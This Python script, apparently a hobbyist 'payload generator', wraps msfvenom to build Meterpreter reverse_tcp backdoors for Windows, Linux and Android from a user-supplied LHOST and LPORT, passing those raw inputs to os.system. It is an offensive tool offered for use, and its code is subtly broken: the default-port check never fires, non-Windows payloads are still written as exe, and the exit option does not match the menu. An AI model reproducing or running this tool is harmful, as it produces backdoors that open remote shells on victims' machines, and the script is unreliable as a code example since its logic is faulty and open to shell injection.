import os
import time

print("""
 ____             _                 _     ____   ___  __  __ ____  
|  _ \ __ _ _   _| | ___   __ _  __| |   | __ ) / _ \|  \/  | __ )
| |_) / _` | | | | |/ _ \ / _` |/ _` |   |  _ \| | | | |\/| |  _ \
|  __/ (_| | |_| | | (_) | (_| | (_| |   | |_) | |_| | |  | | |_) |
|_|   \__,_|\__, |_|\___/ \__,_|\__,_|   |____/ \___/|_|  |_|____/
            |___/
""")
time.sleep(2)
print("""
                 _    ____       _     _
 _ __ ___   ___ | |_ / __ \  ___| |__ | |__  _   _ 
| '__/ _ \ / _ \| __/ / _` |/ _ \ '_ \| '_ \| | | |
| | | (_) | (_) | || | (_| |  __/ |_) | |_) | |_| |
|_|  \___/ \___/ \__\ \__,_|\___|_.__/|_.__/ \__, |
                     \____/                  |___/
""")

time.sleep(2)
print("Automatic payload generator - works with metasploit - msfvenom")
time.sleep(1)
print("Any issues ? contact me : 2003emirkanesme@gmail.com")
time.sleep(1)

print("""
1. Windows
2. Linux
3. Android
4. Ifconfig
99. Exit
""")
chos = int(input("Option : "))
if chos == 1:
    payld = input("Create backdoor to :")
    lhost = input("LHOST : ")
    lport = input("LPORT (default - 4444) : ")
    if lport == None:
        os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport=4444 -f exe > {}".format(lhost,payld))
        print("""
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Your payload: {}
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!        
        """.format(payld))
    else:
        os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -f exe > {}".format(lhost,lport,payld))
        print("""
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Your payload: {}
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!        
        """.format(payld))
elif chos == 2:
    payld = input("Create backdoor to :")
    lhost = input("LHOST : ")
    lport = input("LPORT (default - 4444) : ")
    if lport == None:
        os.system("msfvenom -p python/meterpreter/reverse_tcp lhost={} lport=4444 -f exe > {}".format(lhost,payld))
        print("""
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Your payload: {}
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!        
        """.format(payld))
    else:
        os.system("msfvenom -p python/meterpreter/reverse_tcp lhost={} lport={} -f exe > {}".format(lhost,lport,payld))
        print("""
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Your payload: {}
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!        
        """.format(payld))
elif chos == 3:
    payld = input("Create backdoor to :")
    lhost = input("LHOST : ")
    lport = input("LPORT (default - 4444) : ")
    if lport == None:
        os.system("msfvenom -p android/meterpreter/reverse_tcp lhost={} lport=4444 -f exe > {}".format(lhost,payld))
        print("""
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Your payload: {}
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!        
        """.format(payld))
    else:
        os.system("msfvenom -p android/meterpreter/reverse_tcp lhost={} lport={} -f exe > {}".format(lhost,lport,payld))
        print("""
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Your payload: {}
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!        
        """.format(payld))
elif chos == 4:
    os.system("ifconfig")
elif chos == 5:
    pass
else:
    print("Please Select Printed Options")
